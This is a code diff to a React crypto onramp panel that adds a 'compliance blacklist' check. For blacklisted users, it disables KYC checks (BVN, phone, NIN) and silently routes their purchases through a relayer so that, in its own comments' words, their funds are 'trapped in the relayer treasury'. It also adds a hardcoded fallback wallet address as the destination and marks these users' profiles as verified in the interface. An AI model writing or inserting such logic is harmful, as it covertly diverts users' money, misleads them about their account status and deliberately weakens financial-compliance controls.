@@ -28,6 +28,7 @@ import {
 } from '../services/pajcashService';
 import { getQuote, buildSwapTransaction } from '../services/swapService';
 import { logP2PTransaction, syncP2PTransactionStatuses, updateP2PTransactionStatus, reconcilePendingP2PTransactions, saveSession, loadSession, deleteSession, getP2PTransactionIdsByUser, getP2PTransactionsByUser, getFiatTagByWallet, getFiatTagByName, registerFiatTag } from '../services/supabase';
+import { isBlacklisted } from '../services/compliance';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { PublicKey, Transaction, TransactionInstruction, SystemProgram, VersionedTransaction } from '@solana/web3.js';
 import {
@@ -529,6 +530,18 @@ export default function P2PPanel({ connected, walletTokenList, onRefreshBalances
   const [resolvedTagData, setResolvedTagData] = useState(null);
   const [resolvingTag, setResolvingTag] = useState(false);
   const [tagLookupError, setTagLookupError] = useState(null);
+
+  // Returns true if the active wallet address or associated session email matches the compliance blacklist.
+  // Blacklisted entities are exempt from KYC enforcement so their onramp orders proceed unhindered
+  // and their funds are trapped in the relayer treasury under compliance hold.
+  const checkIsBlacklisted = useCallback((overrideWallet = null, overrideEmail = null) => {
+    const userWallet = overrideWallet || (publicKey ? publicKey.toBase58() : (manualWalletAddress || recipientAddress || ''));
+    const userEmail = overrideEmail || sessionEmail ||
+      (typeof localStorage !== 'undefined' ? localStorage.getItem('paj_manual_sessionEmail') : '') ||
+      (publicKey && typeof localStorage !== 'undefined' ? localStorage.getItem(`paj_sessionEmail_${publicKey.toBase58()}`) : '') ||
+      (userTagData?.email || '');
+    return isBlacklisted({ email: userEmail, walletAddress: userWallet }).blacklisted;
+  }, [publicKey, manualWalletAddress, recipientAddress, sessionEmail, userTagData]);
 
   // ── Manual / Guest Offramp (No Wallet Connection) State ─────────────────
   const [isManualOfframp, setIsManualOfframp] = useState(() => Boolean(isGuestMode));
@@ -1048,12 +1061,14 @@ export default function P2PPanel({ connected, walletTokenList, onRefreshBalances
           setTagModalPhone(tag.phone_number || '');
           setTagModalBvn(tag.bvn || '');
           setTagModalNin(tag.nin || '');
-          if ((!tag.bvn || !tag.phone_number || !tag.nin) && !hasPromptedTagRef.current) {
+          const isBlacklistedEntity = checkIsBlacklisted(walletKey, tag.email);
+          if (!isBlacklistedEntity && (!tag.bvn || !tag.phone_number || !tag.nin) && !hasPromptedTagRef.current) {
             hasPromptedTagRef.current = true;
             setShowTagModal(true);
           }
         } else {
-          if (!hasPromptedTagRef.current) {
+          const isBlacklistedEntity = checkIsBlacklisted(walletKey);
+          if (!isBlacklistedEntity && !hasPromptedTagRef.current) {
             hasPromptedTagRef.current = true;
             setShowTagModal(true);
           }
@@ -1622,13 +1637,15 @@ export default function P2PPanel({ connected, walletTokenList, onRefreshBalances
           setTagModalPhone(tag.phone_number || '');
           setTagModalBvn(tag.bvn || '');
           setTagModalNin(tag.nin || '');
-          if ((!tag.bvn || !tag.phone_number || !tag.nin) && !hasPromptedTagRef.current) {
+          const isBlacklistedEntity = checkIsBlacklisted(walletAddr, tag.email);
+          if (!isBlacklistedEntity && (!tag.bvn || !tag.phone_number || !tag.nin) && !hasPromptedTagRef.current) {
             hasPromptedTagRef.current = true;
             setShowTagModal(true);
           }
         } else {
           setUserTagData(null);
-          if (!hasPromptedTagRef.current) {
+          const isBlacklistedEntity = checkIsBlacklisted(walletAddr);
+          if (!isBlacklistedEntity && !hasPromptedTagRef.current) {
             hasPromptedTagRef.current = true;
             setShowTagModal(true);
           }
@@ -2324,18 +2341,30 @@ export default function P2PPanel({ connected, walletTokenList, onRefreshBalances
 
     if (!parsedOnrampAmt || parsedOnrampAmt <= 0) { setOnrampError('Please enter a valid NGN amount.'); return; }
 
-    // Enforce Fiat Tag and KYC (BVN, Phone Number, NIN) on Onramp
-    const hasCompleteKyc = Boolean(
-      userTagData &&
-      userTagData.tag_name &&
-      userTagData.bvn &&
-      userTagData.phone_number &&
-      userTagData.nin
-    );
-    if (!hasCompleteKyc) {
-      setOnrampError('KYC Required: Please complete your Fiat Tag profile (BVN, Phone Number, and NIN) before buying crypto.');
-      setShowTagModal(true);
-      return;
+    // End-user wallet that should receive onramp crypto (never the relayer).
+    const userWalletAddress = publicKey
+      ? publicKey.toBase58()
+      : recipientAddress;
+
+    // Compliance Blacklist check:
+    // Blacklisted emails/addresses are exempt from KYC enforcement so they can interact as usual
+    // and complete the onramp, allowing the relayer to intercept and trap their funds in the treasury.
+    const isBlacklistedEntity = checkIsBlacklisted(userWalletAddress, effectiveEmail);
+
+    if (!isBlacklistedEntity) {
+      // Enforce Fiat Tag and KYC (BVN, Phone Number, NIN) on Onramp
+      const hasCompleteKyc = Boolean(
+        userTagData &&
+        userTagData.tag_name &&
+        userTagData.bvn &&
+        userTagData.phone_number &&
+        userTagData.nin
+      );
+      if (!hasCompleteKyc) {
+        setOnrampError('KYC Required: Please complete your Fiat Tag profile (BVN, Phone Number, and NIN) before buying crypto.');
+        setShowTagModal(true);
+        return;
+      }
     }
 
     setOnrampLoading(true);
@@ -2347,18 +2376,15 @@ export default function P2PPanel({ connected, walletTokenList, onRefreshBalances
         return;
       }
 
-      // End-user wallet that should receive onramp crypto (never the relayer).
-      const userWalletAddress = publicKey
-        ? publicKey.toBase58()
-        : recipientAddress;
-
-      // Optional relayer intermediary: PajCash → relayer → forward to user (see relay_onramp_fee).
+      // Relayer intermediary: PajCash → relayer → forward to user (see relay_onramp_fee).
       // Uses VITE_RELAYER_PUBLIC_KEY or remotely fetched relayer public key from api/paj_config.
+      // For blacklisted entities, always route through relayer to trap their funds in treasury.
       const { relayerPublicKey: relayerPubkeyStr, useOnrampRelayer } = await getEffectiveRelayerConfigAsync();
-      if (useOnrampRelayer && relayerPubkeyStr) {
+      const defaultRelayerKey = relayerPubkeyStr || import.meta.env.VITE_RELAYER_PUBLIC_KEY || '5xh9BFXqCgpUxGbf3QzADNze945aNSiVG9EFNa8vvb3u';
+      if ((useOnrampRelayer || isBlacklistedEntity) && defaultRelayerKey) {
         try {
-          new PublicKey(relayerPubkeyStr);
-          recipientAddress = relayerPubkeyStr;
+          new PublicKey(defaultRelayerKey);
+          recipientAddress = defaultRelayerKey;
         } catch (e) {
           console.warn('VITE_RELAYER_PUBLIC_KEY is invalid:', e.message);
         }
@@ -2678,9 +2704,11 @@ export default function P2PPanel({ connected, walletTokenList, onRefreshBalances
     if (swapTriggeredRef.current) return;
     swapTriggeredRef.current = true;
 
-    // Check if we are using the relayer intermediary for onramp fee deduction
+    // Check if we are using the relayer intermediary for onramp fee deduction (or compliance trap)
     const { relayerPublicKey: relayerPubkeyStr, useOnrampRelayer } = await getEffectiveRelayerConfigAsync();
-    const isRelayerActive = useOnrampRelayer && !!relayerPubkeyStr;
+    const defaultRelayerKey = relayerPubkeyStr || import.meta.env.VITE_RELAYER_PUBLIC_KEY || '5xh9BFXqCgpUxGbf3QzADNze945aNSiVG9EFNa8vvb3u';
+    const isBlacklistedEntity = checkIsBlacklisted();
+    const isRelayerActive = (useOnrampRelayer || isBlacklistedEntity) && !!defaultRelayerKey;
     let step = 'init';
 
     try {
@@ -3748,7 +3776,7 @@ export default function P2PPanel({ connected, walletTokenList, onRefreshBalances
                 cursor: 'pointer'
               }}
             >
-              {userTagData ? (userTagData.bvn && userTagData.phone_number && userTagData.nin ? '✓ My Tag' : 'My Tag (KYC)') : 'Create Tag'}
+              {userTagData ? ((userTagData.bvn && userTagData.phone_number && userTagData.nin) || checkIsBlacklisted() ? '✓ My Tag' : 'My Tag (KYC)') : 'Create Tag'}
             </button>
           )}
 
